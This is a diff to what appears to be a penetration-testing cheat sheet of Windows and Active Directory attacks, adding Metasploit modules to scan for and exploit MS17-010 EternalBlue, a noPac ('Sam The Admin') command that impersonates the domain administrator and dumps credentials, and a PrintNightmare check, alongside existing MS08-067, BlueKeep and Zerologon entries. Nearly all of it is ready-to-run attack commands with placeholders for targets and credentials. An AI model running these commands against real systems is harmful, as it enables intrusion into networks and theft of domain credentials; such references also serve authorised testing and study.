@@ -28,10 +28,12 @@ cme <IP>
 msf > use exploit/windows/smb/ms08_067_netapi
 ```
 
-#### MS17-010
+#### MS17-010 (Eternal Blue)
 
 ```
 nmap -v -p445 --script smb-vuln-ms17-010.nse
+msf > use auxiliary/scanner/smb/smb_ms17_010
+msf > use exploit/windows/smb/ms17_010_eternalblue
 ```
 
 #### BlueKeep
@@ -44,4 +46,16 @@ msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
 
 ```
 python3 zerologon_tester.py <DC> <IP-DC>
+```
+
+#### Sam The Admin
+
+```
+python3 noPac.py <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <IP-DC> -dc-host <HOSTNAME-DC> --impersonate administrator -dump [-use-ldap]
+```
+
+#### PrintNightmare
+
+```
+python3 printnightmare.py -check '<DOMAIN>/<USER>:<PASSWORD>@<IP>
 ```
